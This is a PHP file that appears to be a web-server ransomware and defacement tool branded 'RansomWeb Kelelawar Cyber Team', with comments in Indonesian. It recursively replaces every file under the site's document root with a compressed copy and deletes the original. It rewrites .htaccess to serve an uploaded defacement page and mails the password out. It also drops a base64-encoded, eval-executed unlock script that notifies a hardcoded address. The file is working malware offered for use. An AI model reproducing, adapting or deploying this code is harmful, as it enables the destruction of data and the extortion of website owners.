<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
?>
<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=0.75, shrink-to-fit=no">
    <meta name="theme-color" content="#000">
    <meta name="description" content="RansomWeb Kelelawar Cyber Team">
  <meta name="author" content="Tn.Error404">
    <!-- Bootstrap CSS -->
    <link href="https://fonts.googleapis.com/css?family=Rock Salt|Righteous" rel="stylesheet">
    <link rel="icon" href="https://images2.imgbox.com/90/f8/AN2yEUQJ_o.jpg" type="image/jpg">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
    <title>RansomWeb Kelelawar Cyber Team</title>
    <style>
    	body{
    		background-color: black;
    		color: white;
    	}
    	#pass{
    		background-color: black;
    		color: white;
    		padding-right: 2px;
    	}
    	h2{
    		font-family: "Rock Salt";
    	}
    	img{
    		width: 450px;
    		height: 10px;
    		opacity:0.050;
				filter:alpha(opacity=10);
				border: 2px solid white;
				transition: 2s;
    	}
    	img:hover{
    		opacity:1;
				filter:alpha(opacity=100);
				width: 450px;
    		height: 260px;
    	}
    </style>
  </head>
  <body>
    <div class="container">
    	<h2 class="text-center mb-3 mt-3">RansomWeb Kelelawar</h2>
    	<hr>
    	<img src="https://k.top4top.io/p_2178vfv5k0.jpg" class="mx-auto d-block">
    	<hr>
    	<form method="post" class="was-validated" enctype="multipart/form-data">
    	<div class="table-bordered p-1">
  		<div class="row">
  			<div class="col">
  			<input id="uploadFile" placeholder="Nama File(Index Web)" disabled="disabled" class="form-control bg-transparent text-light" id="look">
  				</div>
  				<div class="col">
  		<div class="input-group">
  <div class="custom-file">
    <input type="file" class="custom-file-input bg-transparent" id="uploadBtn" name="upl_file">
    <label class="custom-file-label bg-transparent" for="uploadFile"></label>
    </div>
  </div>
 </div>
</div>
</div><hr>
    		<div class="row">
    			<div class="col">
    				<input type="text" name="pass" class="form-control" id="pass" required="required" placeholder="Password" autocomplete="off">
    			</div>
    			<div class="col">
    				<input type="email" name="msg" class="form-control" id="pass" required="required" autocomplete="off" placeholder="Emailmu(Bwt Send Pass)">
    			</div>
    		</div>
    		<input type="submit" class="btn btn-outline-success text-light btn-block mt-2" value="Kunci">
    	</form>
    	<hr>
    		<center>
    			<small>
    			<!-- Ganti Mandull + Maqlo Heker -->
    				Copyright &copy; <?= date('Y'); ?> Kelelawar Cyber Team
    			</small>
    		</center>
    </div>
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
<script type="text/javascript">
	document.getElementById("uploadBtn").onchange = function(){
		document.getElementById("uploadFile").value = this.value;
};
</script>
  </body>
</html>
<?php
if(isset($_POST["pass"])){
// Kirim Password
$untuk   = $_POST["msg"];
$subject = "Password RansomWeb Kelelawar Cyber Team";
$headers = "[!] Password RansomWeb [!]";
$website = $_SERVER["HTTP_HOST"];
$pass    = $_POST["pass"];
$pesan   = "Nama Domain : ".$website."\nPassword : ".$pass."\nTerkunci Pada : ".date('l, d-M-Y')."\nAkses Buka File : http://".$website."/openeds.php";
if(!mail($untuk,$subject,$pesan,$headers)){
	echo "<script>
prompt('Gagal Mengunci File','Alasan => Karena Server Tidak Dapat Mengirim Email. Tar kalo lupa password lu bakal nangis');
</script>";
exit;
}else{

// Luncurkan Aksi
function KunciFile($NamaFile){
		if(strpos($NamaFile, '.kelelawarcyberteam') !== false){
// Kembalikan
			return;
		}
file_put_contents($NamaFile.'.kelelawarcyberteam',gzdeflate(file_get_contents($NamaFile), 9));
copy('.htaccess','.htaccess(BackUp)');
// Hapus File
unlink($NamaFile);

echo "$NamaFile => Terkunci\n";
}
	
echo "<hr>
<center>
<p>Locked File</p>
<small>
Buka File => ".$_SERVER["HTTP_HOST"]."/openeds.php
</small>
</center>
<textarea class='form-control text-dark' disabled rows='8'>";

/* */
function KunciDir($dir){
		$files = array_diff(scandir($dir), array('.','..'));
		foreach($files as $key){
			if(is_dir($dir."/".$key)){
				KunciDir($dir."/".$key);
			}else{
				KunciFile($dir."/".$key);
			}
		}
	}
if(isset($_POST["pass"])){
		KunciDir($_SERVER["DOCUMENT_ROOT"]);
function NamaDomain($url){
			$x = parse_url($url);
			$y = isset($x['host']) ? $x['host'] : '';
			if(preg_match('/(?P<domain>[a-z0-9][a-z0-9\-]{1,63}\.[a-z\.]{2,6})$/i', $y, $a)){
				return $a['domain'];
			} return FALSE;
		}
	}

// Buat Tampilan index web
$server_web = $_SERVER["DOCUMENT_ROOT"];
$nama_file  = $_FILES["upl_file"]["name"];
$tmp_upload = $server_web.'/'.$nama_file;
@copy($_FILES["upl_file"]["tmp_name"],$tmp_upload);
				 
// Buat .htaccess
$b = "#Locked\nDirectoryIndex $nama_file\nErrorDocument 404 /$nama_file";
$a =  fopen(".htaccess","w");
			fwrite($a,$b);
			fclose($a);

// Buat Akses Buka File [ Jangan Diganti!! ]
$x = base64_decode("PD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwo/Pgo8IWRvY3R5cGUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPgogIDxoZWFkPgogICAgPCEtLSBSZXF1aXJlZCBtZXRhIHRhZ3MgLS0+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTAuNzUsIHNocmluay10by1maXQ9bm8iPgoJCTxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iS0NUfHxPRkZJQ0lBTCI+CgkJPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IlVubG9jayBSYW5zb21XZWIgS2VsZWxhd2FyIEN5YmVyIFRlYW0iPgogICAgPCEtLSBCb290c3RyYXAgQ1NTIC0tPgogICAgPGxpbmsgcmVsPSJpY29uIiBocmVmPSJodHRwczovL2Nkbi5waXhhYmF5LmNvbS9waG90by8yMDEyLzA1LzA3LzAyLzQ5L3BpcmF0ZS00NzcwNV85NjBfNzIwLnBuZyIgdHlwZT0iaW1hZ2UvanBnIj4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9zdGFja3BhdGguYm9vdHN0cmFwY2RuLmNvbS9ib290c3RyYXAvNC4xLjMvY3NzL2Jvb3RzdHJhcC5taW4uY3NzIiBpbnRlZ3JpdHk9InNoYTM4NC1NQ3c5OC9TRm5HRThmSlQzR1h3RU9uZ3NWN1p0MjdOWEZvYW9BcG1ZbTgxaXVYb1BrRk9Kd0o4RVJka25MUE1PIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj4KICAgIDx0aXRsZT5SYW5zb21XZWIgS2VsZWxhd2FyIEN5YmVyIFRlYW08L3RpdGxlPgogIDwvaGVhZD4KICA8Ym9keSBjbGFzcz0iYmctZGFyayI+CiAgCTxoMyBjbGFzcz0idGV4dC1jZW50ZXIgdGV4dC1saWdodCBtdC0zIj5IYXlvIE1hdSBCdWthIFJhbnNvbSBZYWg8L2gzPjxocj4KICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAJPGZvcm0gbWV0aG9kPSJwb3N0Ij4KICAgIAkJPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InBhc3MiIGNsYXNzPSJmb3JtLWNvbnRyb2wgbWItMyIgcGxhY2Vob2xkZXI9IkJpc21pbGxhaCBTZW5nIFBlbnRpbmcgWWFraW4iPgogICAgCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1wcmltYXJ5IGJ0bi1ibG9jayIgdmFsdWU9IkJ1a2EgRmlsZSI+CiAgICAJPC9mb3JtPgogICAgCTxocj4KICAgIAkJPGNlbnRlcj4KICAgIAkJCTxzbWFsbCBjbGFzcz0idGV4dC1saWdodCI+CiAgICAJCQk8IS0tIEdhbnRpIE1hbmR1bGwgKyBNYXFsbyBIZWtlciAtLT4KICAgIAkJCQlDb3B5cmlnaHQgJmNvcHk7IDw/PSBkYXRlKCdZJyk7ID8+IEtlbGVsYXdhciBDeWJlciBUZWFtCiAgICAJCQk8L3NtYWxsPgogICAgCQk8L2NlbnRlcj4KICAgIDwvZGl2PgoKICAgIDwhLS0gT3B0aW9uYWwgSmF2YVNjcmlwdCAtLT4KICAgIDwhLS0galF1ZXJ5IGZpcnN0LCB0aGVuIFBvcHBlci5qcywgdGhlbiBCb290c3RyYXAgSlMgLS0+CiAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jb2RlLmpxdWVyeS5jb20vanF1ZXJ5LTMuMy4xLnNsaW0ubWluLmpzIiBpbnRlZ3JpdHk9InNoYTM4NC1xOGkvWCs5NjVEek8wclQ3YWJLNDFKU3RRSUFxVmdSVnpwYnpvNXNtWEtwNFlmUnZIKzhhYnRURTFQaTZqaXpvIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9wb3BwZXIuanMvMS4xNC4zL3VtZC9wb3BwZXIubWluLmpzIiBpbnRlZ3JpdHk9InNoYTM4NC1aTVA3clZvM21JeWtWKzIrOUozVUo0NmpCazBXTGFVQWRuNjg5YUN3b3FiQkppU25qQUsvbDhXdkNXUElQbTQ5IiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KICAgIDxzY3JpcHQgc3JjPSJodHRwczovL3N0YWNrcGF0aC5ib290c3RyYXBjZG4uY29tL2Jvb3RzdHJhcC80LjEuMy9qcy9ib290c3RyYXAubWluLmpzIiBpbnRlZ3JpdHk9InNoYTM4NC1DaGZxcXh1WlVDbkpTSzMrTVhtUE5JeUU2WmJXaDJJTXFFMjQxcllpcUp4eU1pWjZPVy9KbVpRNXN0d0VVTFR5IiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KICA8L2JvZHk+CjwvaHRtbD4KPD9waHAKJHBhc3MgPSAiSGFja2VkIjsgLy8gUGFzc3dvcmQgRGVmYXVsdAokbWFpbCA9ICJhbmFraGVrZXJwcm9AZ21haWwuY29tIjsKJGRwcyAgPSAiaWtpc2tyaXBrdXhjb2siOwppZihpc3NldCgkX1BPU1RbInBhc3MiXSkpewoJaWYobWQ1KCRfUE9TVFsicGFzcyJdKSA9PSAkcGFzcyl7CgkJZnVuY3Rpb24gQnVrYUZpbGUoJE5hbWFGaWxlKXsKCQkJaWYoc3RycG9zKCROYW1hRmlsZSwnLmtlbGVsYXdhcmN5YmVydGVhbScpID09PSBGQUxTRSl7CgkJCQlyZXR1cm47IC8vIEtlbWJhbGlrYW4hCgkJCX0KJEJ1a2EgPSBnemluZmxhdGUoZmlsZV9nZXRfY29udGVudHMoJE5hbWFGaWxlKSk7CmZpbGVfcHV0X2NvbnRlbnRzKHN0cl9yZXBsYWNlKCcua2VsZWxhd2FyY3liZXJ0ZWFtJywgJycsICROYW1hRmlsZSksICRCdWthKTsKCi8vIEhhcHVzIEZpbGUKdW5saW5rKCcuaHRhY2Nlc3MnKTsKdW5saW5rKCROYW1hRmlsZSk7CgplY2hvICIkTmFtYUZpbGUgPT4gVGVyYnVrYW4iOwoJCX0KCQkKZWNobyAiPGhyPgo8Y2VudGVyPgo8cCBjbGFzcz0ndGV4dC1saWdodCc+VW5sb2NrIEZpbGU8L3A+CjwvY2VudGVyPgo8dGV4dGFyZWEgY2xhc3M9J2Zvcm0tY29udHJvbCB0ZXh0LWRhcmsnIGRpc2FibGVkIHJvd3M9JzgnPiI7CgoJCWZ1bmN0aW9uIEJ1a2FEaXIoJGRpcil7CgkJCSRmaWxlcyA9IGFycmF5X2RpZmYoc2NhbmRpcigkZGlyKSwgYXJyYXkoJy4nLCAnLi4nKSk7CgkJCWZvcmVhY2goJGZpbGVzIGFzICRrZXkpewoJCQkJaWYoaXNfZGlyKCRkaXIuIi8iLiRrZXkpKXsKCQkJCQlCdWthRGlyKCRkaXIuIi8iLiRrZXkpOwoJCQkJfWVsc2V7CgkJCQkJQnVrYUZpbGUoJGRpci4iLyIuJGtleSk7CgkJCQl9CgkJCX0KCQl9CgkJQnVrYURpcigkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddKTsKCQl1bmxpbmsoJF9TRVJWRVJbJ1BIUF9TRUxGJ10pOwoJCXVubGluaygnb3BlbmVkcy5waHAnKTsKCQl1bmxpbmsoJy5odGFjY2VzcycpOwoJCWNvcHkoJy5odGFjY2VzcyhCYWNrVXApJywnLmh0YWNjZXNzJyk7CgkJdW5saW5rKCcuaHRhY2Nlc3MoQmFja1VwKScpOwoKJHVudHVrICAgPSAkbWFpbDsKJHN1YmplY3QgPSAiUmFuc29tV2ViIEtlbGVsYXdhciI7CiRoZWFkZXJzID0gIlshXSBSYW5zb21XZWIgS2VsZWxhd2FyIEN5YmVyIFRlYW0gWyFdIjsKJHdlYnNpdGUgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07CiRwZXNhbiAgID0gIk5hbWEgRG9tYWluIDogIi4kd2Vic2l0ZS4iblRlcmJ1a2EgUGFkYSA6ICIuZGF0ZSgnbCwgZC1NLVknKS4iblNjcmlwdCBEZWZhY2UgOiBodHRwOi8vIi4kd2Vic2l0ZS4iLyIuJGRwcy4ibm5UaGFua3MgRGFoIE1lbmdndW5ha2FuIFJhbnNvbSBLYW1pOikiOwptYWlsKCR1bnR1aywkc3ViamVjdCwkcGVzYW4sJGhlYWRlcnMpOwoJCmVjaG8gIjwvdGV4dGFyZWE+CjxzY3JpcHQ+CnByb21wdCgnU3Vrc2VzIE1lbWJ1a2EgU2VtdWEgRmlsZScsZG9jdW1lbnQuZG9tYWluKTsKPC9zY3JpcHQ+IjsKCX1lbHNlewoJCWVjaG8gIjxzY3JpcHQ+YWxlcnQoJ1Bhc3N3b3JkIFRpZGFrIENvY29rJyk8L3NjcmlwdD4iOwoJfQoJZXhpdDsKfQo/Pg==");
$mx = str_replace("anakhekerpro@gmail.com", $_POST["msg"], $x);
$y = str_replace("Hacked", md5($_POST["pass"]), $mx);
$xyz = str_replace("ikiskripkuxcok", $nama_file, $y);
$z = "<?php eval('?>'.base64_decode("."'".base64_encode($xyz)."'".").'<?php '); ?>";
$xy = fopen('openeds.php','w');
			fwrite($xy, $z);
			fclose($xy);


/* Done */
	
echo "</textarea>
<script>
prompt('Sukses Mengunci Semua File',document.domain);
</script>";
	}
}
?>